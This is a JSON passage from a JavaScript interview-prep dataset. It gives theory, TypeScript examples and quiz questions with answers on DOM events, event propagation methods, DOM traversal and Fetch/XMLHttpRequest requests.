      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_dom_events",
          "title": "DOM Events and Event Handling",
          "content": "## Introduction to DOM Events\nDOM (Document Object Model) events are signals sent by the browser to notify your code that something has happened on the web page. These events can be triggered by user interactions (like clicks, key presses, mouse movements), browser actions (like page loading, resizing), or even programmatically.\n\nEvents are a fundamental part of interactive web development, allowing JavaScript to react to user actions and update the UI dynamically.\n\n## Attaching Event Listeners\nThe most common way to handle events is using the `addEventListener()` method. This method allows you to register a function (the event handler) to be called whenever a specified event is delivered to the target.\n\n### Syntax:\n```typescript\ntarget.addEventListener(type, listener, [options]);\n```\n- `type`: A string representing the event type (e.g., 'click', 'mouseover', 'submit').\n- `listener`: The function to be called when the event occurs.\n- `options` (optional): An object that specifies characteristics about the event listener, such as:\n    - `capture`: A boolean indicating that events of this type will be dispatched to the registered `listener` before being dispatched to any `EventTarget` beneath it in the DOM tree. (Default: `false`, meaning bubbling phase).\n    - `once`: A boolean indicating that the `listener` should be invoked at most once after being added. If `true`, the `listener` would be automatically removed when invoked.\n    - `passive`: A boolean indicating that the `listener` will never call `preventDefault()`. If a listener calls `preventDefault()`, the user agent will still ignore it, but it will generate a console warning.\n\n### The Event Object\nWhen an event occurs, the browser creates an `Event` object and passes it as the first argument to the event handler function. This object contains important information about the event, such as:\n- `event.target`: The actual element on which the event occurred (the innermost element).\n- `event.currentTarget`: The element to which the event listener was attached.\n- `event.type`: The type of event (e.g., 'click').\n- `event.clientX`, `event.clientY`: Coordinates of the mouse pointer (for mouse events).\n- `event.key`, `event.keyCode`: Information about the key pressed (for keyboard events).\n\n## Event Bubbling and Capturing\nWhen an event is triggered on an element, it doesn't just stay on that element. It propagates through the DOM tree in two phases:\n1.  **Capturing Phase:** The event starts from the `window` object and travels down to the `event.target` (the actual element that triggered the event).\n2.  **Bubbling Phase:** The event then travels back up from the `event.target` to the `window` object.\n\nMost event listeners are registered for the bubbling phase by default. You can specify `capture: true` in the `addEventListener` options to listen during the capturing phase.\n\n## Event Delegation\nEvent delegation is a technique where you attach a single event listener to a parent element, rather than attaching individual listeners to multiple child elements. This technique relies on event bubbling.\n\n### Benefits of Event Delegation:\n-   **Performance:** Fewer event listeners mean less memory consumption and better performance, especially for lists with many items.\n-   **Dynamic Content:** It automatically handles events for elements that are added to the DOM dynamically *after* the initial page load, without needing to re-attach listeners.\n-   **Cleaner Code:** Reduces the amount of repetitive code.\n\n### How it works:\nThe event listener on the parent listens for events bubbling up from its children. Inside the handler, you can then check `event.target` to determine which specific child element triggered the event and react accordingly.\n\n## Custom Events\nBesides built-in browser events, you can create and dispatch your own custom events. This is useful for building loosely coupled components or for communicating between different parts of your application without direct dependencies.\n\n### `CustomEvent` Constructor:\n```typescript\nconst customEvent = new CustomEvent(type, [options]);\n```\n- `type`: A string representing the event type (e.g., 'myComponentReady').\n- `options` (optional): An object with properties:\n    - `detail`: A property that allows you to pass any custom data along with the event. This data can be accessed via `event.detail` in the event listener.\n    - `bubbles`: A boolean indicating whether the event should bubble up the DOM tree (default: `false`).\n    - `cancelable`: A boolean indicating whether the event is cancelable (default: `false`).\n\n### `dispatchEvent()` Method:\nAfter creating a custom event, you dispatch it on a specific DOM element using `element.dispatchEvent(eventObject)`.\nAny element on the DOM tree (or `document`, `window`) can dispatch an event, and any element can listen for it.",
          "examples": [
            {
              "id": "example_dom_events_1",
              "title": "Basic Event Listener",
              "code": "// index.html\n// <button id=\"myButton\">Click Me</button>\n\n// script.js\nconst myButton = document.getElementById('myButton');\n\nfunction handleClick(event) {\n  console.log('Button clicked!', event.target.textContent);\n  console.log('Event type:', event.type);\n}\n\nmyButton.addEventListener('click', handleClick);\n\n// Event listener with options (once)\nconst onceButton = document.getElementById('onceButton');\nif (onceButton) {\n  onceButton.addEventListener('click', () => {\n    console.log('This message will only show once.');\n  }, { once: true });\n}",
              "explanation": "This example demonstrates attaching a simple 'click' event listener to a button. When the button is clicked, the `handleClick` function is executed, logging information about the event target and type. The second part shows how to use the `once` option to make an event listener fire only a single time.",
              "language": "typescript"
            },
            {
              "id": "example_dom_events_2",
              "title": "Event Delegation",
              "code": "// index.html\n// <ul id=\"itemList\">\n//   <li>Item 1</li>\n//   <li>Item 2</li>\n//   <li>Item 3</li>\n// </ul>\n// <button id=\"addItemBtn\">Add New Item</button>\n\n// script.js\nconst itemList = document.getElementById('itemList');\nconst addItemBtn = document.getElementById('addItemBtn');\nlet itemCounter = 3;\n\n// Use event delegation on the parent <ul>\nitemList.addEventListener('click', function(event) {\n  // Check if the clicked element is an <li>\n  if (event.target.tagName === 'LI') {\n    console.log('Clicked on item:', event.target.textContent);\n    event.target.style.backgroundColor = 'yellow';\n  }\n});\n\n// Add new items dynamically\naddItemBtn.addEventListener('click', function() {\n  itemCounter++;\n  const newItem = document.createElement('li');\n  newItem.textContent = `Item ${itemCounter}`;\n  itemList.appendChild(newItem);\n  console.log(`Added new item: Item ${itemCounter}`);\n});",
              "explanation": "This example illustrates event delegation. Instead of attaching a listener to each `<li>` element, a single listener is attached to the parent `<ul>`. When any `<li>` is clicked, the event bubbles up to the `<ul>`. The handler then checks `event.target.tagName` to confirm it was an `<li>` and processes the click. This pattern correctly handles dynamically added `<li>` elements.",
              "language": "typescript"
            },
            {
              "id": "example_dom_events_3",
              "title": "Custom Events",
              "code": "// index.html\n// <div id=\"myComponent\">My Component</div>\n\n// script.js\nconst myComponent = document.getElementById('myComponent');\n\n// 1. Define a custom event\nconst componentReadyEvent = new CustomEvent('componentReady', {\n  detail: {\n    timestamp: new Date().toISOString(),\n    message: 'Component initialization complete!'\n  },\n  bubbles: true, // Allow the event to bubble up\n  cancelable: false\n});\n\n// 2. Attach a listener for the custom event\nmyComponent.addEventListener('componentReady', function(event) {\n  console.log('Custom event received on component:', event.type);\n  console.log('Detail data:', event.detail);\n});\n\n// A parent element can also listen due to bubbling\ndocument.body.addEventListener('componentReady', function(event) {\n  console.log('Custom event bubbled up to body:', event.type);\n  console.log('Detail data:', event.detail);\n});\n\n// 3. Dispatch the custom event after some logic (e.g., component setup)\nsetTimeout(() => {\n  console.log('Dispatching custom event...');\n  myComponent.dispatchEvent(componentReadyEvent);\n}, 1000);",
              "explanation": "This example shows how to create and dispatch a custom event. A `CustomEvent` named 'componentReady' is created with `detail` data and set to `bubble`. An event listener is attached to `myComponent` to catch this event. After a delay, the event is dispatched on `myComponent`. Because `bubbles: true` is set, a listener on `document.body` also receives the event, demonstrating event propagation for custom events.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_dom_events_1",
            "question_dom_events_2",
            "question_dom_events_3",
            "question_dom_events_4",
            "question_dom_events_5",
            "question_dom_events_10"
          ],
          "relatedTasks": [
            "task_dom_events_1"
          ],
          "tags": [
            "DOM",
            "Events",
            "Event Handling",
            "Event Delegation",
            "Custom Events",
            "JavaScript"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "html_basics",
            "css_basics",
            "javascript_syntax",
            "dom_basics"
          ],
          "complexity": 6,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "single_page_applications",
            "component_architecture",
            "interactive_ui"
          ]
        },
        {
          "id": "theory_event_methods",
          "title": "Event Methods: stopPropagation() vs preventDefault()",
          "content": "## Introduction to Event Object Methods\nThe `Event` object passed to an event listener provides several useful methods to control event behavior, most notably `stopPropagation()` and `preventDefault()`.\n\n## `event.stopPropagation()`\nThis method stops the event from bubbling up the DOM tree (or propagating further during the capturing phase, if called during capturing). If `stopPropagation()` is called, parent elements (or child elements in capturing phase) will not receive the event, even if they have listeners attached for that event type.\n\n### Use Cases:\n-   Preventing a click on a nested element from triggering a click handler on its parent.\n-   Stopping a modal dialog's click event from closing the dialog if the click originated inside it.\n\n## `event.preventDefault()`\nThis method prevents the default action that the user agent (browser) would normally perform when an event occurs. This does NOT stop the event from bubbling or capturing; it only cancels the default browser behavior.\n\n### Common Default Actions:\n-   Clicking a link (`<a>`) navigates to a new URL.\n-   Submitting a form (`<form>`) reloads the page.\n-   Pressing a spacebar on a focused element scrolls the page.\n-   Right-clicking opens the context menu.\n-   Dragging an image opens it in a new tab.\n\n### Use Cases:\n-   Preventing form submission to handle it with AJAX.\n-   Stopping a link from navigating to a new page to implement client-side routing.\n-   Disabling right-click context menus.\n\n## Key Differences and Combined Usage\nIt's crucial to understand that `stopPropagation()` and `preventDefault()` address entirely different aspects of event handling:\n\n| Feature           | `event.stopPropagation()`                                | `event.preventDefault()`                                 |\n| :---------------- | :------------------------------------------------------- | :------------------------------------------------------- |\n| **Effect**        | Stops event propagation (bubbling/capturing).            | Prevents the browser's default action for the event.     |\n| **Propagation**   | Stops event from reaching parent/child listeners.        | Allows event to continue propagating normally.           |\n| **Default Action**| Does not prevent default browser actions.                | Prevents default browser actions.                        |\n| **Independence**  | Can be used independently.                               | Can be used independently.                               |\n\n### Using Both Together\nYou can, and often will, use both methods together when you want to both prevent a default browser action *and* stop the event from propagating further. For example, in a custom form submission handler, you might want to prevent the default form submission (reload) and also stop the event from bubbling up to a global document click listener that might interfere.\n\n```typescript\nelement.addEventListener('click', function(event) {\n  event.stopPropagation(); // Stop bubbling\n  event.preventDefault();  // Prevent default action (if any)\n  // Your custom logic\n});\n```",
          "examples": [
            {
              "id": "example_event_methods_1",
              "title": "Using stopPropagation()",
              "code": "// index.html\n// <div id=\"outer\" style=\"padding: 20px; background: lightblue;\">\n//   Outer Div\n//   <button id=\"innerButton\" style=\"margin: 10px;\">Inner Button</button>\n// </div>\n\n// script.js\nconst outerDiv = document.getElementById('outer');\nconst innerButton = document.getElementById('innerButton');\n\nouterDiv.addEventListener('click', function() {\n  console.log('Outer div clicked!');\n});\n\ninnerButton.addEventListener('click', function(event) {\n  console.log('Inner button clicked!');\n  event.stopPropagation(); // Prevents the click from bubbling up to outerDiv\n});",
              "explanation": "In this example, clicking the 'Inner Button' will trigger its own listener, which then calls `event.stopPropagation()`. As a result, the click event will not bubble up to the `outerDiv`, and the 'Outer div clicked!' message will not appear in the console. If `stopPropagation()` were removed, both messages would appear.",
              "language": "typescript"
            },
            {
              "id": "example_event_methods_2",
              "title": "Using preventDefault()",
              "code": "// index.html\n// <form id=\"myForm\">\n//   <input type=\"text\" name=\"username\">\n//   <button type=\"submit\">Submit</button>\n// </form>\n// <a id=\"myLink\" href=\"https://www.example.com\">Visit Example</a>\n\n// script.js\nconst myForm = document.getElementById('myForm');\nconst myLink = document.getElementById('myLink');\n\nmyForm.addEventListener('submit', function(event) {\n  event.preventDefault(); // Prevents the default form submission (page reload)\n  console.log('Form submission prevented. Handling with JavaScript...');\n  // You would typically send an AJAX request here\n});\n\nmyLink.addEventListener('click', function(event) {\n  event.preventDefault(); // Prevents default link navigation\n  console.log('Link navigation prevented. Implementing client-side routing...');\n  // You would typically handle routing here (e.g., using React Router, Vue Router)\n});",
              "explanation": "This example demonstrates `preventDefault()`. For the form, `event.preventDefault()` stops the browser from reloading the page upon submission, allowing JavaScript to handle the submission (e.g., via AJAX). For the link, `event.preventDefault()` stops the browser from navigating to the URL specified in the `href` attribute, allowing for client-side routing logic.",
              "language": "typescript"
            },
            {
              "id": "example_event_methods_3",
              "title": "Using Both stopPropagation() and preventDefault()",
              "code": "// index.html\n// <div id=\"container\" style=\"padding: 20px; background: lightcoral;\">\n//   Container\n//   <a id=\"cancelLink\" href=\"#\" style=\"margin: 10px; display: block;\">Click to Cancel Action</a>\n// </div>\n\n// script.js\nconst container = document.getElementById('container');\nconst cancelLink = document.getElementById('cancelLink');\n\ncontainer.addEventListener('click', function() {\n  console.log('Container clicked!');\n});\n\ncancelLink.addEventListener('click', function(event) {\n  event.stopPropagation(); // Stop click from bubbling to container\n  event.preventDefault();  // Stop default link behavior (e.g., jumping to #)\n  console.log('Link action canceled and bubbling stopped.');\n  // Perform some specific action for this link only\n});",
              "explanation": "Here, clicking the 'Click to Cancel Action' link will trigger its listener. It calls both `stopPropagation()` to prevent the event from reaching the `container` div's click listener and `preventDefault()` to prevent the default browser behavior associated with clicking an anchor tag (which in this case would be scrolling to the top or to an element with id '#').",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_event_methods_1",
            "question_event_methods_2",
            "question_event_methods_3",
            "question_event_methods_4",
            "question_event_methods_5"
          ],
          "relatedTasks": [
            "task_event_methods_1"
          ],
          "tags": [
            "DOM",
            "Events",
            "Event Handling",
            "stopPropagation",
            "preventDefault",
            "JavaScript"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "theory_dom_events"
          ],
          "complexity": 7,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "requiredFor": [
            "interactive_ui",
            "custom_controls",
            "form_validation",
            "router_implementation"
          ]
        },
        {
          "id": "theory_dom_traversal",
          "title": "DOM Traversal and Manipulation",
          "content": "## Introduction to DOM Traversal\nDOM traversal refers to the process of navigating through the Document Object Model (DOM) tree to select, access, and manipulate elements relative to a starting point. Understanding how to traverse the DOM is essential for dynamic web applications, allowing you to find specific elements, modify their content, or change their structure based on user interactions or data.\n\n## Selecting Elements\nBefore traversing, you often need a starting element. Modern JavaScript provides several powerful methods to select elements:\n\n1.  **`document.getElementById(id)`**:\n    -   Returns a reference to the element by its ID. IDs must be unique within a document.\n    -   Returns `null` if no element with the specified ID is found.\n    -   **Performance:** Generally the fastest method for direct element access.\n\n2.  **`document.querySelector(selector)`**:\n    -   Returns the *first* element within the document (or a specific element, if called on an element) that matches the specified CSS selector(s).\n    -   Returns `null` if no matches are found.\n    -   Can select by ID (`#id`), class (`.class`), tag name (`tag`), attribute (`[attr]`), or complex combinations.\n\n3.  **`document.querySelectorAll(selector)`**:\n    -   Returns a static `NodeList` containing all elements within the document (or a specific element) that match the specified CSS selector(s).\n    -   Returns an empty `NodeList` if no matches are found.\n    -   The returned `NodeList` is *static*, meaning it won't update if elements are added or removed from the DOM after it's created. To iterate, you can use `forEach` or convert to an array (`Array.from()`).\n\n## Navigating Relationships\nOnce you have an element, you can navigate to its related elements using various properties:\n\n1.  **Parent Elements:**\n    -   `element.parentNode`: Returns the direct parent `Node` (which could be an `Element`, `Document`, or `DocumentFragment`).\n    -   `element.parentElement`: Returns the direct parent `Element`. Returns `null` if the parent is not an `Element` (e.g., if the parent is the `document` itself).\n    *Use `parentElement` when you specifically need another HTML element.*\n\n2.  **Child Elements:**\n    -   `element.children`: Returns a live `HTMLCollection` of all child *elements* (excluding text nodes, comments, etc.). This collection is *live*, meaning it automatically updates if children are added or removed.\n    -   `element.childNodes`: Returns a live `NodeList` of all child *nodes*, including text nodes, comment nodes, and element nodes.\n    -   `element.firstChild`: Returns the first child `Node`.\n    -   `element.firstElementChild`: Returns the first child *Element*.\n    -   `element.lastChild`: Returns the last child `Node`.\n    -   `element.lastElementChild`: Returns the last child *Element*.\n\n3.  **Sibling Elements:**\n    -   `element.nextSibling`: Returns the next sibling `Node`.\n    -   `element.nextElementSibling`: Returns the next sibling *Element*.\n    -   `element.previousSibling`: Returns the previous sibling `Node`.\n    -   `element.previousElementSibling`: Returns the previous sibling *Element*.\n\n### `NodeList` vs `HTMLCollection`\n-   **`NodeList`**: A collection of nodes (can contain elements, text nodes, comments). Returned by `querySelectorAll`, `childNodes`. Can be static or live. `NodeList.prototype.forEach` is available.\n-   **`HTMLCollection`**: A collection of only HTML elements. Returned by `children`, `getElementsByClassName`, `getElementsByTagName`. Always live. Doesn't have `forEach` directly (you can use `Array.from()` or a `for...of` loop).\n\n### Iterating over Collections\n```typescript\n// For NodeList (e.g., from querySelectorAll)\nconst elements = document.querySelectorAll('.my-class');\nelements.forEach(el => console.log(el.textContent));\n\n// For HTMLCollection (e.g., from children)\nconst parent = document.getElementById('parent');\nfor (const child of parent.children) {\n  console.log(child.tagName);\n}\n\n// Or convert to array for any collection:\nArray.from(parent.children).forEach(el => console.log(el.id));\n```",
          "examples": [
            {
              "id": "example_dom_traversal_1",
              "title": "Element Selection",
              "code": "// index.html\n// <div id=\"app\">\n//   <p class=\"text-item\">First paragraph</p>\n//   <span class=\"text-item\">First span</span>\n//   <p class=\"text-item highlighted\">Second paragraph</p>\n// </div>\n\n// script.js\n// Get by ID\nconst appDiv = document.getElementById('app');\nconsole.log('App div:', appDiv);\n\n// Query selector (first matching element)\nconst firstParagraph = document.querySelector('p');\nconsole.log('First paragraph:', firstParagraph.textContent);\n\nconst highlightedItem = document.querySelector('.highlighted');\nconsole.log('Highlighted item:', highlightedItem.textContent);\n\n// Query selector all (all matching elements)\nconst allTextItems = document.querySelectorAll('.text-item');\nconsole.log('All text items (NodeList):', allTextItems);\n\nallTextItems.forEach(item => {\n  console.log('Item content:', item.textContent);\n});",
              "explanation": "This example demonstrates how to select elements using `getElementById`, `querySelector`, and `querySelectorAll`. `getElementById` is direct. `querySelector` gets the first match. `querySelectorAll` returns a `NodeList` of all matches, which can be iterated using `forEach`.",
              "language": "typescript"
            },
            {
              "id": "example_dom_traversal_2",
              "title": "Navigating Relationships",
              "code": "// index.html\n// <div id=\"grandparent\">\n//   <div id=\"parent1\">\n//     <span id=\"child1\">Child 1</span>\n//     <p id=\"child2\">Child 2</p>\n//   </div>\n//   <div id=\"parent2\">\n//     <div id=\"child3\">Child 3</div>\n//   </div>\n// </div>\n\n// script.js\nconst child1 = document.getElementById('child1');\n\n// Parent element\nconst parent1 = child1.parentElement;\nconsole.log('Parent of child1:', parent1.id);\n\nconst grandparent = parent1.parentElement;\nconsole.log('Grandparent of child1:', grandparent.id);\n\n// Children elements\nconsole.log('Children of parent1 (HTMLCollection):', parent1.children);\nArray.from(parent1.children).forEach(child => {\n  console.log('Parent1 child:', child.id);\n});\n\n// Siblings\nconst nextSiblingOfChild1 = child1.nextElementSibling;\nconsole.log('Next sibling of child1:', nextSiblingOfChild1.id);\n\nconst previousSiblingOfChild2 = nextSiblingOfChild1.previousElementSibling;\nconsole.log('Previous sibling of child2:', previousSiblingOfChild2.id);\n\n// First/Last element child\nconsole.log('First child element of parent1:', parent1.firstElementChild.id);\nconsole.log('Last child element of parent1:', parent1.lastElementChild.id);",
              "explanation": "This example showcases various DOM traversal properties. It starts with 'child1' and demonstrates how to get its parent (`parentElement`), its siblings (`nextElementSibling`, `previousElementSibling`), and how to get all children of a parent element (`children`) and iterate over them. It also highlights `firstElementChild` and `lastElementChild` for direct access to element children.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_dom_traversal_1",
            "question_dom_traversal_2",
            "question_dom_traversal_3",
            "question_dom_traversal_4",
            "question_dom_traversal_5"
          ],
          "relatedTasks": [
            "task_dom_traversal_1"
          ],
          "tags": [
            "DOM",
            "Traversal",
            "Manipulation",
            "getElementById",
            "querySelector",
            "querySelectorAll",
            "NodeList",
            "HTMLCollection",
            "JavaScript"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "dom_basics",
            "html_structure"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "dynamic_ui_updates",
            "component_interaction",
            "legacy_code_maintenance"
          ]
        },
        {
          "id": "theory_ajax_fetch_api",
          "title": "AJAX and Fetch API for Asynchronous Data Fetching",
          "content": "## Introduction to Asynchronous JavaScript and XML (AJAX)\nAJAX (Asynchronous JavaScript and XML) is a set of web development techniques that allows a web page to communicate with a server asynchronously without requiring a full page reload. This enables dynamic and interactive web applications where data can be fetched or sent in the background, updating parts of the page without interrupting the user's experience. Although 'XML' is in the name, JSON is now the most common data format used.\n\nHistorically, the `XMLHttpRequest` (XHR) object was the primary way to perform AJAX requests. More recently, the `Fetch API` has emerged as a modern, promise-based alternative.\n\n## XMLHttpRequest (XHR)\n`XMLHttpRequest` is a built-in browser object that provides a way to interact with servers. It's an older API, primarily callback-based, which can lead to 'callback hell' for complex sequences of requests.\n\n### Key Concepts:\n-   **Lifecycle:** An XHR request goes through several `readyState` values:\n    -   `0 (UNSENT)`: Client has been created. `open()` not called yet.\n    -   `1 (OPENED)`: `open()` has been called.\n    -   `2 (HEADERS_RECEIVED)`: `send()` has been called, and headers and status are available.\n    -   `3 (LOADING)`: Downloading; `responseText` holds partial data.\n    -   `4 (DONE)`: The operation is complete.\n-   **`onreadystatechange`:** An event handler that is called whenever the `readyState` attribute changes. You typically check `readyState === 4` for completion.\n-   **`status`:** The HTTP status code of the response (e.g., `200` for success, `404` for not found, `500` for server error).\n-   **`responseText` / `response`:** The response data from the server, typically a string. For JSON, you need to parse it using `JSON.parse()`.\n\n### Basic Steps:\n1.  Create an `XMLHttpRequest` instance: `const xhr = new XMLHttpRequest();`\n2.  Open a request: `xhr.open(method, url, [async, user, password]);` (`async` is typically `true`)\n3.  Set up event handlers (e.g., `onreadystatechange`, `onload`, `onerror`)\n4.  Send the request: `xhr.send([body]);`\n\n## Fetch API\nThe `Fetch API` provides a modern, promise-based interface for making network requests. It's simpler and cleaner than `XMLHttpRequest`, especially for chaining requests and handling errors.\n\n### Key Concepts:\n-   **Promise-based:** `fetch()` returns a `Promise` that resolves to a `Response` object. This makes chaining operations (like parsing JSON) and error handling much more straightforward using `.then()` and `.catch()`.\n-   **`Response` object:** The `Response` object represents the response to a request. It has properties like `ok` (boolean, true if status is 200-299), `status`, `statusText`, and methods for parsing the body (e.g., `json()`, `text()`, `blob()`).\n-   **Error Handling:** `fetch()` only rejects the promise for network errors (e.g., no internet connection). HTTP error statuses (like 404 or 500) do *not* cause the promise to reject. You must explicitly check `response.ok` or `response.status` to handle these.\n\n### Basic Steps:\n1.  Call `fetch(url, [options])`: Returns a Promise.\n2.  Handle the `Response` object: Check `response.ok`, then call a parsing method (e.g., `response.json()`, which also returns a Promise).\n3.  Handle the parsed data.\n4.  Catch any network errors.\n\n### `fetch` Options (Common):\n-   `method`: 'GET', 'POST', 'PUT', 'DELETE', etc. (default 'GET')\n-   `headers`: An object of HTTP headers.\n-   `body`: The request body for POST/PUT requests (e.g., `JSON.stringify(data)`).\n-   `mode`: 'cors', 'no-cors', 'same-origin' (default 'cors')\n-   `credentials`: 'omit', 'same-origin', 'include' (for cookies/auth headers)\n-   `signal`: An `AbortSignal` for canceling requests.\n\n## AbortController\nThe `AbortController` interface allows you to abort one or more DOM requests as and when desired. This is particularly useful for long-running requests or when a user navigates away from a page before a request completes, preventing unnecessary network activity and potential memory leaks.\n\n### How it works:\n1.  Create an `AbortController` instance: `const controller = new AbortController();`\n2.  Get its `signal` property: `const signal = controller.signal;`\n3.  Pass this `signal` as an option to the `fetch()` request:\n    `fetch(url, { signal });`\n4.  To abort the request, call `controller.abort();`.\n\nWhen a request is aborted, the `fetch` promise will reject with an `AbortError`. You should catch this error to distinguish it from other network errors.",
          "examples": [
            {
              "id": "example_ajax_fetch_api_1",
              "title": "Basic XMLHttpRequest (GET)",
              "code": "const xhr = new XMLHttpRequest();\n\nxhr.open('GET', 'https://jsonplaceholder.typicode.com/posts/1', true); // true for asynchronous\n\nxhr.onreadystatechange = function() {\n  if (xhr.readyState === 4) { // Request is complete\n    if (xhr.status >= 200 && xhr.status < 300) { // Success status codes\n      try {\n        const response = JSON.parse(xhr.responseText);\n        console.log('XHR Success:', response);\n      } catch (e) {\n        console.error('XHR JSON Parse Error:', e);\n      }\n    } else {\n      console.error('XHR Error:', xhr.status, xhr.statusText);\n    }\n  }\n};\n\nxhr.onerror = function() {\n  console.error('XHR Network Error: The request could not be made.');\n};\n\nxhr.send();\nconsole.log('XHR request sent...');",
              "explanation": "This example demonstrates a basic GET request using `XMLHttpRequest`. It sets up an `onreadystatechange` handler to monitor the request's progress. When `readyState` is 4 (DONE), it checks the `status` code to determine success or failure. For successful responses, `responseText` is parsed as JSON. An `onerror` handler is also included for network-level issues.",
              "language": "typescript"
            },
            {
              "id": "example_ajax_fetch_api_2",
              "title": "Basic Fetch API (GET) with Error Handling",
              "code": "fetch('https://jsonplaceholder.typicode.com/posts/1')\n  .then(response => {\n    // Check if the response was successful (HTTP status 200-299)\n    if (!response.ok) {\n      // Throw an error to be caught by the .catch() block\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    return response.json(); // Parse the response body as JSON\n  })\n  .then(data => {\n    console.log('Fetch Success:', data);\n  })\n  .catch(error => {\n    // Catches network errors or errors thrown in the .then() block\n    console.error('Fetch Error:', error);\n  });\n\nconsole.log('Fetch request initiated...');",
              "explanation": "This example shows a basic GET request using the `Fetch API`. It's promise-based, making the flow more readable. The first `.then()` block checks `response.ok` for HTTP success (200-299). If not `ok`, it throws an error. Otherwise, `response.json()` is called to parse the body, which returns another promise. The second `.then()` handles the parsed data. The `.catch()` block handles both network errors and explicit errors thrown.",
              "language": "typescript"
            },
            {
              "id": "example_ajax_fetch_api_3",
              "title": "Fetch API (POST) with Headers and Body",
              "code": "async function createPost() {\n  const postData = {\n    title: 'foo',\n    body: 'bar',\n    userId: 1,\n  };\n\n  try {\n    const response = await fetch('https://jsonplaceholder.typicode.com/posts', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json',\n      },\n      body: JSON.stringify(postData),\n    });\n\n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n\n    const data = await response.json();\n    console.log('POST Success:', data);\n  } catch (error) {\n    console.error('POST Error:', error);\n  }\n}\n\ncreatePost();",
              "explanation": "This example demonstrates a POST request using `Fetch API` with `async/await` syntax for cleaner asynchronous code. It sets the `method` to 'POST', defines `headers` for content type, and sends `JSON.stringify`ed data in the `body`. Error handling is similar to GET, checking `response.ok`.",
              "language": "typescript"
            },
            {
              "id": "example_ajax_fetch_api_4",
              "title": "Canceling a Fetch Request with AbortController",
              "code": "const controller = new AbortController();\nconst signal = controller.signal;\n\nasync function fetchDataWithCancellation() {\n  try {\n    console.log('Fetching data...');\n    const response = await fetch('https://jsonplaceholder.typicode.com/posts/1', { signal });\n\n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n\n    const data = await response.json();\n    console.log('Data fetched successfully:', data);\n  } catch (error) {\n    if (error.name === 'AbortError') {\n      console.warn('Fetch aborted:', error.message);\n    } else {\n      console.error('Fetch Error:', error);\n    }\n  }\n}\n\n// Start the fetch request\nfetchDataWithCancellation();\n\n// Abort the request after 50ms (or some condition)\nsetTimeout(() => {\n  controller.abort();\n  console.log('Attempted to abort fetch request.');\n}, 50);",
              "explanation": "This example shows how to use `AbortController` to cancel a `fetch` request. An `AbortController` and its `signal` are created. The `signal` is passed to the `fetch` options. A `setTimeout` is used to simulate a condition where the request needs to be canceled by calling `controller.abort()`. When aborted, the `fetch` promise rejects with an `AbortError`, which is specifically caught and logged.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_ajax_fetch_api_1",
            "question_ajax_fetch_api_2",
            "question_ajax_fetch_api_3",
            "question_ajax_fetch_api_4",
            "question_ajax_fetch_api_5",
            "question_ajax_fetch_api_6",
            "question_ajax_fetch_api_7"
          ],
          "relatedTasks": [
            "task_ajax_fetch_api_1"
          ],
          "tags": [
            "AJAX",
            "Fetch API",
            "XMLHttpRequest",
            "Asynchronous",
            "Promises",
            "HTTP",
            "AbortController",
            "Network"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_async",
            "javascript_promises",
            "http_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "requiredFor": [
            "data_fetching",
            "spa_development",
            "realtime_applications",
            "api_integration"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_dom_events_1",
          "topic": "DOM Events - Basic Handling",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following methods is commonly used to attach an event listener to a DOM element in JavaScript?",
          "answer": "addEventListener()",
          "options": [
            "attachEvent()",
            "addEventListener()",
            "onEvent()",
            "handleEvent()"
          ],
          "analysisPoints": [
            "Understanding of modern DOM event handling methods.",
            "Distinguishing between standard and deprecated/non-standard methods.",
            "Knowledge of `addEventListener`'s widespread usage and flexibility."
          ],
          "keyConcepts": [
            "DOM Events",
            "Event Listener",
            "addEventListener"
          ],
          "evaluationCriteria": [
            "Correct identification of the primary method for event attachment.",
            "Awareness of common DOM APIs."
          ],
          "example": "```typescript\nconst button = document.getElementById('myButton');\nbutton.addEventListener('click', function() {\n  console.log('Button clicked!');\n});\n```\n`addEventListener()` is the standard and recommended way to attach event listeners in modern JavaScript. It allows multiple event handlers for the same event type on the same element and offers more control via its `options` parameter (e.g., `capture`, `once`, `passive`). `attachEvent()` was an older, IE-specific method.",
          "tags": [
            "DOM",
            "Events",
            "JavaScript",
            "Fundamentals"
          ],
          "prerequisites": [
            "dom_basics",
            "javascript_syntax"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_dom_events_2",
          "topic": "DOM Events - Event Object Properties",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following HTML and JavaScript:\n\nHTML:\n```html\n<div id=\"outer\">\n  <button id=\"inner\">Click Me</button>\n</div>\n```\n\nJavaScript:\n```javascript\ndocument.getElementById('outer').addEventListener('click', function(event) {\n  console.log('Event Target:', event.target.id);\n  console.log('Event CurrentTarget:', event.currentTarget.id);\n});\n```\n\nIf the 'Click Me' button (`#inner`) is clicked, what will be logged to the console?",
          "answer": "Event Target: inner\nEvent CurrentTarget: outer",
          "options": [
            "Event Target: outer\nEvent CurrentTarget: outer",
            "Event Target: inner\nEvent CurrentTarget: inner",
            "Event Target: inner\nEvent CurrentTarget: outer",
            "Event Target: outer\nEvent CurrentTarget: inner"
          ],
          "analysisPoints": [
            "Understanding of `event.target` vs `event.currentTarget`.",
            "Knowledge of event bubbling mechanism.",
            "Ability to trace event propagation."
          ],
          "keyConcepts": [
            "DOM Events",
            "Event Bubbling",
            "event.target",
            "event.currentTarget",
            "Event Delegation"
          ],
